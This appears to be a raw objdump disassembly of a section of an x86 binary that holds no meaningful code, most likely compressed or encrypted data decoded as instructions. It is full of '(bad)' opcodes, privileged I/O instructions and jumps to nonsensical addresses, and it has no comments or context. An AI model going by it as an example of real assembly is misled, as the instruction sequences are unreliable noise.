  42074f:	outs   dx,BYTE PTR ds:[esi]
  420750:	push   esp
  420751:	(bad)
  420755:	psubusb mm5,mm7
  420758:	xor    DWORD PTR [ebp+0x24e4d702],eax
  42075e:	pop    ss
  42075f:	xor    eax,0xc378cffd
  420764:	dec    edi
  420765:	fadd   DWORD PTR [ecx]
  420767:	(bad)  
  420769:	scas   eax,DWORD PTR es:[edi]
  42076a:	(bad)  
  42076b:	sbb    dl,BYTE PTR [edx+ebx*1-0x9c967b1]
  420772:	lea    eax,[ebx-0x1d]
  420775:	xor    al,0xde
  420777:	xchg   ecx,eax
  420778:	sti    
  420779:	bound  esp,QWORD PTR [edx+0xb]
  42077c:	xchg   DWORD PTR [ecx+0x3001b1fa],eax
  420782:	ror    DWORD PTR [ebx+0x7c],1
  420785:	pop    ds
  420786:	shr    BYTE PTR [ecx+0x49],1
  420789:	jns    0xf25f46da
  42078f:	out    dx,eax
  420790:	mov    al,0xdf
  420792:	scas   eax,DWORD PTR es:[edi]
  420793:	jo     0x4207c5
  420795:	mov    bl,0x75
  420797:	mov    esp,0xbd878ed9
  42079c:	outs   dx,BYTE PTR ds:[esi]
  42079d:	sti    
  42079e:	jle    0x420815
  4207a0:	(bad)  
  4207a1:	pop    ss
  4207a2:	out    dx,al
  4207a3:	push   0xaddbcbc5
  4207a8:	cmc    
  4207a9:	das    
  4207aa:	imul   edi,DWORD PTR [edx],0x34
  4207ad:	(bad)  
  4207af:	add    eax,0xbb55b6b9
  4207b4:	sbb    eax,DWORD PTR [ebx]
  4207b6:	cmp    al,0x99
  4207b8:	jno    0x42080f
  4207ba:	jno    0x4207fb
  4207bc:	pusha  
  4207bd:	mov    ah,0x60
  4207bf:	dec    edi
  4207c0:	int    0x50
  4207c2:	ins    DWORD PTR es:[edi],dx
  4207c3:	rcr    DWORD PTR [esi],1
  4207c5:	xchg   esi,eax
  4207c6:	arpl   ax,di
  4207c8:	fisub  WORD PTR [esi+eiz*1]
  4207cb:	cwde   
  4207cc:	retf   
  4207cd:	popa   
  4207ce:	xchg   esi,eax
  4207cf:	pop    eax
  4207d0:	(bad)  
  4207d1:	js     0x4207ff
  4207d3:	fisubr DWORD PTR ds:0x27719e83
  4207d9:	sar    DWORD PTR [ecx-0x6a610f5],0x5d
  4207e0:	data16 and BYTE PTR [eax-0x39],cl
  4207e4:	jmp    DWORD PTR [ebp+0x21929ee9]
  4207ea:	fimul  WORD PTR [edi-0x62]
  4207ed:	stc    
  4207ee:	and    BYTE PTR [ecx-0x48],bh
  4207f1:	ins    BYTE PTR es:[edi],dx
  4207f2:	lahf   
  4207f3:	adc    ah,BYTE PTR [ecx-0x5c]
  4207f6:	mov    dh,0x5b
  4207f8:	jmp    0xd12b3d7c
  4207fd:	mov    bl,BYTE PTR [edi]
  4207ff:	cli    
  420800:	outs   dx,BYTE PTR ds:[esi]
  420801:	out    0xdf,eax
  420803:	add    ebp,eax
  420805:	or     DWORD PTR [edx+edx*4+0x58],edi
  420809:	add    edi,ebx
  42080b:	push   ebp
  42080c:	popf   
  42080d:	xchg   edx,eax
  42080e:	inc    eax
  42080f:	outs   dx,BYTE PTR ds:[esi]
  420810:	mov    ah,0xef
  420812:	jo     0x4207be
  420814:	jmp    0xf64cb045
  420819:	ds adc al,0x3
  42081c:	xchg   esi,ebx
  42081e:	ins    BYTE PTR es:[edi],dx
  42081f:	cmc    
  420820:	cmp    BYTE PTR [edi],al
  420822:	and    ah,BYTE PTR [eax+0x41]
  420825:	inc    ebx
  420826:	push   0xce161116
  42082b:	cmp    ch,dl
  42082d:	dec    edi
  42082e:	fmul   QWORD PTR fs:[edx-0x65]
  420832:	pop    eax
  420833:	inc    esp
  420834:	into   
  420835:	jp     0x4207f4
  420837:	shl    DWORD PTR [edx+0x3dfe8303],cl
  42083d:	add    al,0xff
  42083f:	nop
  420840:	jge    0x420850
  420842:	outs   dx,DWORD PTR ds:[si]
  420844:	xchg   esi,eax
  420845:	dec    esi
  420846:	xchg   DWORD PTR [esi-0x26b2ae9c],ebx
  42084c:	bound  esi,QWORD PTR [edx+0x5b]
  42084f:	xor    eax,0x71beb156
  420854:	push   ds
  420855:	xchg   edx,eax
  420856:	mov    dl,0xc9
  420858:	iret   
  420859:	xchg   BYTE PTR [ebp-0x73ae5bd7],cl
  42085f:	iret   
  420860:	pop    ss
  420861:	mov    esi,0x3512abc
  420866:	sub    cl,BYTE PTR [ebp+0x75]
  420869:	push   eax
  42086a:	add    eax,DWORD PTR [ecx-0x20a5ee11]
  420870:	iret   
  420871:	add    al,0xbd
  420873:	add    al,0x3
  420875:	xchg   bp,ax
  420877:	test   eax,0x5da3639e
  42087c:	or     BYTE PTR [edx-0x2f],dh
  42087f:	ins    DWORD PTR es:[edi],dx
  420880:	sbb    eax,0x3d050386
  420885:	pcmpgtb mm5,QWORD PTR [esi+0x18]
  420889:	enter  0x7e41,0x49
  42088d:	pop    edx
  42088e:	or     esp,DWORD PTR [ecx+edx*4]
  420891:	fcmovnbe st,st(4)
  420893:	test   eax,0x11374d5e
  420898:	inc    edx
  420899:	jnp    0x420846
  42089b:	mul    bh
  42089d:	jns    0x4208a4
  42089f:	popa   
  4208a0:	jo     0x420851
  4208a2:	mov    ebx,0x57f20db
  4208a7:	cs mov edi,0x4daabc31
  4208ad:	cmp    al,0x38
  4208af:	retf   0x526c
  4208b2:	cdq    
  4208b3:	cli    
  4208b4:	jmp    0xb25c:0xc1d69ede
  4208bb:	pop    esp
  4208bc:	aas    
  4208bd:	mov    ecx,0x49945513
  4208c2:	rol    dl,cl
  4208c4:	ja     0x4208ea
  4208c6:	cld    
  4208c7:	mov    al,es:0x4b2c1b94
  4208cd:	call   0xb088c8bf
  4208d2:	xor    DWORD PTR [ecx+0x76],esp
  4208d5:	or     al,0xcb
  4208d7:	and    edx,DWORD PTR [esi-0x632052]
  4208dd:	(bad)  
  4208de:	dec    bl
  4208e0:	jl     0x4208c5
  4208e2:	or     eax,0x772bcf4
  4208e7:	push   ebp
  4208e8:	lods   eax,DWORD PTR ds:[esi]
  4208e9:	dec    esi
  4208ea:	js     0x420885
  4208ec:	loope  0x420928
  4208ee:	cmc    
  4208ef:	push   esp
  4208f0:	jb     0x420932
  4208f2:	sub    dl,BYTE PTR [edi+0x75]
  4208f5:	pop    edi
  4208f6:	lods   eax,DWORD PTR ds:[esi]
  4208f7:	inc    esi
  4208f8:	cld    
  4208f9:	ins    BYTE PTR es:[edi],dx
  4208fa:	or     esp,DWORD PTR [ebp+0x5b]
  4208fd:	sar    esi,1
  4208ff:	mov    al,ds:0x29777309
  420904:	cmc    
  420905:	in     eax,dx
  420906:	test   eax,0x7887cd1
  42090b:	ret    
  42090c:	xor    dh,ah
  42090e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42090f:	pmaxub mm0,mm5
  420912:	adc    dl,bl
  420914:	mov    DWORD PTR [ebp-0x5ede33f3],edx
  42091a:	inc    esp
  42091b:	jbe    0x42092c
  42091d:	add    BYTE PTR [ebx-0x4a],ah
  420920:	add    cl,al
  420922:	ror    DWORD PTR [eax+0x0],1
	...
  420930:	add    BYTE PTR [ecx-0x57],cl
  420933:	cmp    BYTE PTR [ebp-0x2126208],bl
  420939:	pop    edx
  42093a:	rcr    BYTE PTR [eax+edx*2-0x563ba4dc],0x19
  420942:	add    DWORD PTR [ecx],0x0
  420945:	stos   DWORD PTR es:[edi],eax
  420946:	add    eax,DWORD PTR [eax]
  420948:	add    bl,dl
  42094a:	cmp    eax,DWORD PTR [esi+0x233fb652]
  420950:	lea    ebp,[esi]
  420952:	adc    eax,0xe9143ec1
  420957:	out    dx,al
  420958:	mov    esi,0x5542aeed
  42095d:	shl    DWORD PTR [ebx],cl
  42095f:	test   DWORD PTR [bx],0x5a2a6124
  420966:	pop    ds
  420967:	or     al,0xd6
  420969:	scas   eax,DWORD PTR es:[edi]
  42096a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42096b:	fnstsw WORD PTR [edi]
  42096d:	enter  0x52d6,0x12
  420971:	xchg   ah,cl
  420973:	xchg   ebp,eax
  420974:	dec    esi
  420975:	sub    DWORD PTR [eax-0x1c],0x48d2d1b5
  42097c:	mov    esp,0xdd09a81
  420981:	inc    BYTE PTR [esi+esi*1-0x3c174dd8]
  420988:	outs   dx,DWORD PTR ds:[esi]
  420989:	jg     0x4209b7
  42098b:	inc    edx
  42098c:	retf   
  42098d:	clc    
  42098e:	retf   
  42098f:	push   esp
  420990:	test   al,0x40
  420992:	add    al,0xec
  420994:	push   edi
  420995:	sti    
  420996:	loopne 0x42094a
  420998:	mov    eax,0xa339fce5
  42099d:	hlt    
  42099e:	cwde   
  42099f:	push   ds
  4209a0:	fisttp DWORD PTR [ecx+0x50]
  4209a3:	sub    DWORD PTR [eax],0xdd2cf443
  4209a9:	push   es
  4209aa:	test   cl,dh
  4209ac:	or     ch,al
  4209ae:	mov    bl,0xcd
  4209b0:	or     DWORD PTR [ebx],ecx
  4209b2:	and    al,BYTE PTR ds:0x4356269c
  4209b8:	hlt    
  4209b9:	xchg   DWORD PTR [esi],esp
  4209bb:	push   es
  4209bc:	cld    
  4209bd:	or     eax,0xc1741ad0
  4209c2:	pop    esp
  4209c3:	jo     0x4209fe
  4209c5:	(bad)  
  4209c6:	clc    
  4209c7:	icebp  
  4209c8:	mov    dh,0xef
  4209ca:	scas   al,BYTE PTR es:[edi]
  4209cb:	addr16 mov dh,0xb2
  4209ce:	inc    ecx
  4209cf:	xchg   DWORD PTR [edi+ebx*8+0x14f0b0ef],ebp
  4209d6:	jne    0x420a29
  4209d8:	daa    
  4209d9:	jge    0x420962
  4209db:	or     eax,0x4bae89f3
  4209e0:	in     eax,0x2d
  4209e2:	inc    ebx
  4209e3:	and    BYTE PTR [eax-0x4c],ah
  4209e6:	inc    ebx
  4209e7:	jg     0x4209e1
  4209e9:	fsubr  DWORD PTR [ebx]
  4209eb:	mov    cl,0x0
  4209ed:	rol    ebx,cl
  4209ef:	sbb    BYTE PTR ds:0x101d6166,0x15
  4209f6:	fild   DWORD PTR [eax]
  4209f8:	lods   al,BYTE PTR ds:[esi]
  4209f9:	fistp  QWORD PTR [edx]
  4209fb:	xor    al,0xc
  4209fd:	imul   esp,DWORD PTR [edi],0x10
  420a00:	add    eax,0x3b1d5af9
  420a05:	xchg   ecx,eax
  420a06:	jb     0x4209d5
  420a08:	inc    esp
  420a09:	push   esi
  420a0a:	inc    ebp
  420a0b:	or     edx,DWORD PTR [edi-0x406061ba]
  420a11:	jle    0x4209e1
  420a13:	dec    esp
  420a14:	mov    cl,dh
  420a16:	cdq    
  420a17:	cmp    BYTE PTR [ebp+edi*4-0x62258c35],dh
  420a1e:	aaa    
  420a1f:	push   ss
  420a20:	jns    0x420a0f
  420a22:	xor    al,cl
  420a24:	lock or BYTE PTR ds:0x92cfe89d,dh
  420a2b:	sti    
  420a2c:	das    
  420a2d:	std    
  420a2e:	imul   ebx,DWORD PTR [ecx-0x75],0x2e
  420a32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a33:	mov    ah,0x6e
  420a35:	xchg   ebx,eax
  420a36:	outs   dx,DWORD PTR ds:[esi]
  420a37:	mov    gs,WORD PTR [edx+0x71]
  420a3a:	jmp    0x420a5c
  420a3c:	ins    BYTE PTR es:[edi],dx
  420a3d:	sti    
  420a3e:	cmp    eax,edi
  420a40:	ins    DWORD PTR es:[edi],dx
  420a41:	dec    ebx
  420a42:	test   al,0xbf
  420a44:	xor    BYTE PTR [edi+0x3f],bl
  420a47:	and    BYTE PTR [edi+0x72],ah
  420a4a:	pop    esi
  420a4b:	adc    BYTE PTR [ebp+0x33],ch
  420a4e:	or     ecx,DWORD PTR [ebx-0x66c79aff]
  420a54:	fsub   st,st(0)
  420a56:	pop    es
  420a57:	dec    edi
  420a58:	fdivr  st,st(5)
  420a5a:	into   
  420a5b:	and    esi,DWORD PTR [eax]
  420a5d:	jb     0x420a5e
  420a5f:	gs popa 
  420a61:	test   al,0x55
  420a63:	(bad)  
  420a64:	mov    esp,0x8d65bed5
  420a69:	pop    ds
  420a6a:	(bad)  
  420a6b:	shl    BYTE PTR [esi-0x75],cl
  420a6e:	mov    ds:0xe6bc2456,al
  420a73:	(bad)  
  420a74:	xlat   BYTE PTR ds:[ebx]
  420a75:	js     0x420a00
  420a77:	ds retf 
  420a79:	div    BYTE PTR ds:0x62b926b
  420a7f:	je     0x420a9b
  420a81:	pop    ecx
  420a82:	dec    edx
  420a83:	adc    al,0x95
  420a85:	pop    es
  420a86:	dec    esp
  420a87:	add    cl,bh
  420a89:	adc    eax,0xa2ba9ecd
  420a8e:	jae    0x420aa5
  420a90:	mov    dl,0xb1
  420a92:	rcl    DWORD PTR ds:0xb648b7a2,0x80
  420a99:	push   ds
  420a9a:	(bad)
  420a9e:	fmulp  st(3),st
  420aa0:	aad    0xb8
  420aa2:	fld    QWORD PTR [edi-0x5a53a013]
  420aa8:	addr16 mov ch,0x69
  420aab:	aaa    
  420aac:	call   DWORD PTR [esi+0x2b73439d]
  420ab2:	mov    edx,0xc5bc5589
  420ab7:	ret    
  420ab8:	repnz int 0x82
  420abb:	pop    ss
  420abc:	pop    ebx
  420abd:	ins    DWORD PTR es:[edi],dx
  420abe:	inc    edi
  420abf:	clc    
  420ac0:	mov    al,ds:0x713f67ae
  420ac5:	pop    esp
  420ac6:	jo     0x420b38
  420ac8:	adc    eax,0x28d99fbc
  420acd:	imul   eax,DWORD PTR cs:[eax],0x9c39329d
  420ad4:	ror    BYTE PTR [edx-0x69832720],cl
  420ada:	adc    al,0xc8
  420adc:	popf   
  420add:	xchg   ebp,eax
  420ade:	in     al,dx
  420adf:	inc    ecx
  420ae0:	cmp    BYTE PTR [ebx],ch
  420ae2:	iret   
  420ae3:	pusha  
  420ae4:	cmp    BYTE PTR [edi-0x7c61ef2d],bh
  420aea:	icebp  
  420aeb:	mov    DWORD PTR [esi+0x2fefb393],ecx
  420af1:	mov    ah,0x45
  420af3:	dec    edx
  420af4:	outs   dx,BYTE PTR ds:[esi]
  420af5:	lods   eax,DWORD PTR ds:[esi]
  420af6:	mov    edx,0x9d9d746
  420afb:	add    ebp,DWORD PTR [ebp-0x12dc35a7]
  420b01:	(bad)  
  420b02:	push   esp
  420b03:	dec    esp
  420b04:	push   esi
  420b05:	pop    es
  420b06:	inc    ebp
  420b07:	dec    BYTE PTR [ebx+0xb19892f]
  420b0d:	iret   
  420b0e:	dec    eax
  420b0f:	pop    es
  420b10:	mov    cl,0xf5
  420b12:	dec    esi
  420b13:	(bad)  
  420b14:	clc    
  420b15:	(bad)
  420b18:	mov    bl,0x75
  420b1a:	jns    0x420ace
  420b1c:	sbb    dh,dh
  420b1e:	inc    eax
  420b1f:	or     esp,DWORD PTR [esi]
  420b21:	sub    DWORD PTR [eax],edx
  420b23:	jecxz  0x420b80
  420b25:	sahf   
  420b26:	test   al,0x1c
  420b28:	mov    esi,0xfb4a1ced
  420b2d:	xor    ebp,ebp
  420b2f:	test   al,0x80
  420b31:	adc    DWORD PTR [ecx],esi
  420b33:	mov    esi,0x5d9eaf6a
  420b38:	imul   ecx,DWORD PTR [eax+esi*1+0x4d],0x679a9661
  420b40:	mov    al,ds:0x41072315
  420b45:	mov    eax,ds:0x3d61e2b9
  420b4a:	lds    ebx,FWORD PTR [esi]
  420b4c:	adc    bl,BYTE PTR [ecx]
  420b4e:	inc    ebx
  420b4f:	data16 sbb BYTE PTR [esi],dh
  420b52:	in     eax,0x42
  420b54:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  420b56:	sahf   
  420b57:	push   eax
  420b58:	xlat   BYTE PTR ds:[ebx]
  420b59:	sub    DWORD PTR [ecx+edx*2+0x1],eax
  420b5d:	mov    ebx,0x11e3f080
  420b62:	mov    dl,0xf7
  420b64:	clc    
  420b65:	jmp    0x420b78
  420b67:	pop    esp
  420b68:	pusha  
  420b69:	loopne 0x420b99
  420b6b:	lea    eax,[ecx+eax*2+0x7a0fa6c3]
  420b72:	fidiv  DWORD PTR [edi+0x49]
  420b75:	cwde   
  420b76:	call   0xfcc5:0x933f87a0
  420b7d:	mov    eax,ds:0x528f4b96
  420b82:	and    al,0xc0
  420b84:	test   al,0x19
  420b86:	jg     0x420bae
  420b88:	jp     0x420b5b
  420b8a:	adc    ebp,ebx
  420b8c:	push   0x2
  420b8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b8f:	inc    edi
  420b90:	push   eax
  420b91:	int    0x4d
  420b93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420b94:	in     eax,dx
  420b95:	and    eax,0xb7097142
  420b9a:	fwait
  420b9b:	dec    esp
  420b9c:	xor    al,0x1
  420b9e:	and    eax,0x6afe594f
  420ba3:	and    ebp,DWORD PTR ds:[ebp+0x2bd62e5e]
  420baa:	(bad)  
  420bab:	in     eax,0xc4
  420bad:	add    bl,BYTE PTR [esi+0x3c]
  420bb0:	or     al,0x52
  420bb2:	test   al,0x96
  420bb4:	xchg   esp,eax
  420bb5:	xchg   edx,eax
  420bb6:	ds xchg ebp,eax
  420bb8:	mov    ds:0xe686155b,al
  420bbd:	cdq    
  420bbe:	push   edi
  420bbf:	out    0xed,eax
  420bc1:	cs sub al,0x62
  420bc4:	cli    
  420bc5:	mov    eax,0x942645a5
  420bca:	xor    esp,DWORD PTR [ebx+0x7984d3e2]
  420bd0:	jl     0x420bc2
  420bd2:	sub    al,0x81
  420bd4:	push   eax
  420bd5:	mov    ecx,0xfcdc3daa
  420bda:	aaa    
  420bdb:	faddp  st(5),st
  420bdd:	aad    0xd9
  420bdf:	cwde   
  420be0:	cli    
  420be1:	inc    eax
  420be2:	push   ss
  420be3:	xchg   edi,eax
  420be4:	mov    ds:0xcf21c6a8,al
  420be9:	test   eax,0xc722e09b
  420bef:	push   ss
  420bf0:	xchg   edi,eax
  420bf1:	pop    ebp
  420bf2:	leave  
  420bf3:	(bad)  [ebx+0x23f41eac]
  420bf9:	loope  0x420bde
  420bfb:	or     al,0x9b
  420bfd:	jmp    0x420c2d
  420bff:	ret    0x5b7
  420c02:	dec    edx
  420c03:	mov    ah,0x9c
  420c05:	je     0x420b98
  420c07:	xor    DWORD PTR [ebx],esp
  420c09:	add    BYTE PTR [ebx+edx*4],cl
  420c0c:	sbb    dl,BYTE PTR [edi+0x37]
  420c0f:	rcr    DWORD PTR [eax],0x47
  420c12:	xchg   esi,eax
  420c13:	or     ebx,DWORD PTR [esi+0x4d0fd64]
  420c19:	jns    0x420c23
  420c1b:	sahf   
  420c1c:	xlat   BYTE PTR ds:[ebx]
  420c1d:	cmp    BYTE PTR [edi-0x22477cc0],ch
  420c23:	fist   DWORD PTR [ebx-0x48]
  420c26:	and    BYTE PTR [ecx+0x12],dl
  420c29:	mov    dh,0x2f
  420c2b:	mov    ebp,0x30d3a9ca
  420c30:	xor    edx,DWORD PTR [ebx+0x70]
  420c33:	es jno 0x420c02
  420c36:	lds    eax,FWORD PTR [ecx-0x25156b65]
  420c3c:	add    eax,edi
  420c3e:	sub    al,0x54
  420c40:	loopne 0x420c95
  420c42:	inc    ebp
  420c43:	jno    0x420c78
  420c45:	aaa    
  420c46:	jge    0x420cc1
  420c48:	iret   
  420c49:	jge    0x420c39
  420c4b:	inc    ebp
  420c4c:	stos   BYTE PTR es:[edi],al
  420c4d:	mov    al,ds:0xb7e8dc51
  420c52:	cmc    
  420c53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c54:	or     al,0x6d
  420c56:	in     eax,dx
  420c57:	sbb    edx,eax
  420c59:	clc    
  420c5a:	jmp    0x420c3f
  420c5c:	push   eax
  420c5d:	ror    ebx,cl
  420c5f:	and    eax,0x16c70f97
  420c65:	adc    DWORD PTR [ecx-0x48],edx
  420c68:	ja     0x420cde
  420c6a:	jno    0x420c2a
  420c6c:	and    bh,BYTE PTR [ecx]
  420c6e:	pop    es
  420c6f:	loop   0x420c46
  420c71:	dec    edi
  420c72:	fwait
  420c73:	pop    edi
  420c74:	gs pop ebx
  420c76:	leave  
  420c77:	out    0x9d,eax
  420c79:	sbb    eax,0x89b31d10
  420c7e:	jecxz  0x420c7e
  420c80:	xchg   ebx,eax
  420c81:	mov    edx,0x98b72f80
  420c86:	push   es
  420c87:	mov    DWORD PTR [edi+0xc8eee0f],eax
  420c8d:	mov    al,ds:0xb310f4d2
  420c92:	jae    0x420c76
  420c94:	mov    esi,0xa090a39f
  420c99:	and    ch,BYTE PTR [esi]
  420c9b:	(bad)  
  420c9c:	in     al,dx
  420c9d:	(bad)  [eax+0x27]
  420ca0:	cmp    DWORD PTR [edx-0x202a7cbc],esi
  420ca6:	packsswb mm6,QWORD PTR [eax]
  420ca9:	cmc    
  420caa:	aas    
  420cab:	dec    ecx
  420cac:	ret    
  420cad:	aas    
  420cae:	cmp    eax,0x49545c03
  420cb3:	adc    eax,0xb5d5bfd1
  420cb8:	pop    ecx
  420cb9:	cdq    
  420cba:	cmp    eax,0x81b1a9c5
  420cbf:	jp     0x420cc8
  420cc1:	aad    0xd2
  420cc3:	fbld   TBYTE PTR [edx+0x60421416]
  420cc9:	and    DWORD PTR [ecx-0x367ca104],ebp
  420ccf:	fs mov dl,0xec
  420cd2:	sbb    bh,bh
  420cd4:	inc    esp
  420cd5:	push   0xffffffbf
  420cd7:	fild   QWORD PTR [eax]
  420cd9:	mov    al,0xf3
  420cdb:	mov    eax,ds:0x61f067d1
  420ce0:	imul   ebp,DWORD PTR [ebx-0x32],0x30
  420ce4:	pop    eax
  420ce5:	ret    0x1914
  420ce8:	push   ebp
  420ce9:	xor    eax,0x4f8a69de
  420cee:	xor    eax,DWORD PTR [esi]
  420cf0:	jle    0x420c79
  420cf2:	sbb    ah,BYTE PTR [eax]
	...
  420d00:	add    BYTE PTR [esi],ah
  420d02:	mov    eax,0xbf9f8f0d
  420d07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d08:	mov    ecx,0xfe336cff
  420d0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d0e:	rcr    eax,cl
  420d10:	loop   0x420cd6
  420d12:	xchg   BYTE PTR [ecx],al
  420d14:	add    BYTE PTR [ebx-0x2cfffffd],ch
  420d1a:	sar    ebx,1
  420d1c:	jo     0x420cc6
  420d1e:	outs   dx,BYTE PTR ds:[esi]
  420d1f:	or     al,0x7a
  420d21:	(bad)  
  420d22:	fst    st(5)
  420d24:	into   
  420d25:	jnp    0x420d3c
  420d27:	sbb    eax,0x52d13914
  420d2c:	outs   dx,DWORD PTR ds:[esi]
  420d2d:	adc    BYTE PTR gs:[ecx+0x2f],ah
  420d31:	jp     0x420cf5
  420d33:	adc    BYTE PTR [eax+0x32],bl
  420d36:	xor    edx,esi
  420d38:	or     al,ch
  420d3a:	inc    ebp
  420d3b:	shl    DWORD PTR [eax-0x24],cl
  420d3e:	push   edi
  420d3f:	dec    eax
  420d40:	std    
  420d41:	lods   al,BYTE PTR ds:[esi]
  420d43:	aad    0xd7
  420d45:	cmp    bl,al
  420d47:	clc    
  420d48:	ja     0x420d0b
  420d4a:	js     0x420d01
  420d4c:	shl    BYTE PTR [edi+0x4c],1
  420d4f:	adc    ebx,DWORD PTR [edx]
  420d51:	test   BYTE PTR [esi],ch
  420d53:	je     0x420d7f
  420d55:	iret   
  420d56:	add    dh,cl
  420d58:	ficom  DWORD PTR [edi+0x28]
  420d5b:	push   es
  420d5c:	inc    ebp
  420d5d:	cmp    DWORD PTR [edi*2+0x43214c66],esi
  420d64:	out    0x7f,al
  420d66:	mov    edx,0xa0d068de
  420d6b:	push   ebp
  420d6c:	ret    
  420d6d:	pop    edx
  420d6e:	xchg   esp,eax
  420d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d70:	fisttp WORD PTR es:[esi]
  420d73:	fisubr WORD PTR [edx+0x5f]
  420d76:	(bad)  
  420d77:	lds    ebp,FWORD PTR [eax+0x528fc0ad]
  420d7d:	cmp    BYTE PTR [ebp-0x50d58579],0xee
  420d84:	inc    esp
  420d85:	cmp    al,0x5c
  420d87:	mov    edi,0x40cf5744
  420d8c:	aas    
  420d8d:	std    
  420d8e:	scas   al,BYTE PTR es:[edi]
  420d8f:	ins    BYTE PTR es:[edi],dx
  420d90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d92:	mov    ds:0x1e2b8a71,al
  420d97:	imul   esp,DWORD PTR [ebp-0x2bb84d44],0xffffffd4
  420d9e:	xor    eax,0xfa6d5b9c
  420da3:	sbb    BYTE PTR [ecx-0x717e2258],dl
  420da9:	jnp    0x420de4
  420dab:	jae    0x420df1
  420dad:	retf   
  420dae:	sub    al,0xd6
  420db0:	xchg   ebp,eax
  420db1:	rol    DWORD PTR [edi-0x79470ef1],cl
  420db7:	cmp    BYTE PTR [eax-0x79],cl
  420dba:	push   esi
  420dbb:	push   ss
  420dbc:	loop   0x420d93
  420dbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420dbf:	iret   
  420dc0:	adc    al,0x75
  420dc2:	and    eax,0x72bb8b93
  420dc7:	mov    ds:0x94139ef,al
  420dcc:	cmp    al,0x2b
  420dce:	loopne 0x420e43
  420dd0:	imul   esi,DWORD PTR [edx-0x156b41b7],0x5f521805
  420dda:	lock ds ret 
  420ddd:	sbb    eax,0x7b6331c8
  420de2:	aad    0xf4
  420de4:	repnz or ebp,edx
  420de7:	cmp    DWORD PTR [ecx+ebp*1-0xe],ebp
  420deb:	pop    es
  420dec:	pushf  
  420ded:	mov    edx,0xc0be016d
  420df2:	xor    DWORD PTR [edx-0xc],edi
  420df5:	les    eax,FWORD PTR [edx]
  420df7:	mul    esp
  420df9:	(bad)  
  420dfb:	dec    edx
  420dfc:	leave  
  420dfd:	out    0x34,eax
  420dff:	test   eax,0x6c30e3db
  420e04:	scas   al,BYTE PTR es:[edi]
  420e05:	ret    0xd78
  420e08:	(bad)  
  420e09:	xor    esp,DWORD PTR [esi+0x50a959]
  420e0f:	hlt    
  420e10:	or     edi,edx
  420e12:	stc    
  420e13:	dec    ebp
  420e14:	push   cs
  420e15:	mov    DWORD PTR [esi+esi*4+0x36],esp
  420e19:	mov    ds:0x65c520b4,al
  420e1e:	popa   
  420e1f:	test   BYTE PTR [eax+ecx*8+0x6a],bl
  420e23:	mov    bl,0xf2
  420e25:	jno    0x420e6c
  420e27:	fs inc ecx
  420e29:	mov    bl,0x4b
  420e2b:	pop    ss
  420e2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e2d:	xchg   ecx,eax
  420e2e:	loopne 0x420e38
  420e30:	and    ecx,DWORD PTR [ecx-0x53]
  420e33:	in     eax,0xef
  420e35:	jecxz  0x420e44
  420e37:	mov    bh,BYTE PTR [ebp+0x65b39b01]
  420e3d:	scas   al,BYTE PTR es:[edi]
  420e3e:	inc    eax
  420e3f:	add    eax,0x24c3db64
  420e44:	mov    esi,0x46f2654b
  420e49:	jle    0x420e8e
  420e4b:	ins    BYTE PTR es:[edi],dx
  420e4c:	adc    dh,bh
  420e4e:	in     eax,0x55
  420e50:	pop    es
  420e51:	mov    ds:0xa517f2bc,al
  420e56:	int    0x3b
  420e58:	add    ebx,DWORD PTR [edx]
  420e5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e5b:	xor    eax,0x1e56f0cf
  420e60:	scas   al,BYTE PTR es:[edi]
  420e61:	xchg   ebp,eax
  420e62:	cld    
  420e63:	jp     0x420e53
  420e65:	dec    eax
  420e66:	push   ebp
  420e67:	inc    ebp
  420e68:	std    
  420e69:	cmp    eax,0xd9a7915c
  420e6e:	call   0xc9e83304
  420e73:	mov    ds:0x3a651558,al
  420e78:	and    eax,0xc280be19
  420e7d:	cmp    cl,BYTE PTR ds:0x1d5c54bf
  420e83:	xchg   esp,ebp
  420e85:	add    esp,esi
  420e87:	mov    ds:0x2be1e172,eax
  420e8c:	je     0x420e26
  420e8e:	stc    
  420e8f:	hlt    
  420e90:	cwde   
  420e91:	xchg   ebp,eax
  420e92:	jo     0x420efc
  420e94:	cmp    eax,0x280d09a2
  420e99:	fs aaa 
  420e9b:	mov    edi,0x1e427d01
  420ea0:	push   ebp
  420ea1:	push   edx
  420ea2:	fcmovnb st,st(6)
  420ea4:	mov    eax,0xa896b7e0
  420ea9:	jns    0x420ea3
  420eab:	lods   al,BYTE PTR ds:[esi]
  420eac:	dec    esi
  420ead:	dec    edx
  420eae:	sti    
  420eaf:	add    BYTE PTR [eax+0x3a],dl
  420eb2:	jne    0x420ed0
  420eb4:	inc    ebp
  420eb5:	test   DWORD PTR [edi-0x58],eax
  420eb8:	push   ebp
  420eb9:	fdivr  QWORD PTR [ebp-0x4e]
  420ebc:	mov    ebx,0xbd4a8d4b
  420ec1:	fwait
  420ec2:	push   eax
  420ec3:	jmp    0x463f5191
  420ec8:	mov    BYTE PTR [edi+0x2e],0xf3
  420ecc:	xor    edx,DWORD PTR [ebx]
  420ece:	outs   dx,DWORD PTR ds:[esi]
  420ecf:	xor    bl,dh
  420ed1:	inc    eax
  420ed2:	mov    ecx,DWORD PTR [ecx+0x21e0a9eb]
  420ed8:	sub    eax,0x4b448c35
  420edd:	sahf   
  420ede:	pop    eax
  420edf:	xor    ebp,DWORD PTR [edx+0x47]
  420ee2:	or     bh,BYTE PTR [ebx+0x67]
  420ee5:	inc    esp
  420ee6:	cdq    
  420ee7:	push   0xeef818d5
  420eec:	and    al,0x27
  420eee:	cs xor edi,ecx
  420ef1:	test   BYTE PTR [ebx+0x17],ah
  420ef4:	add    dl,dh
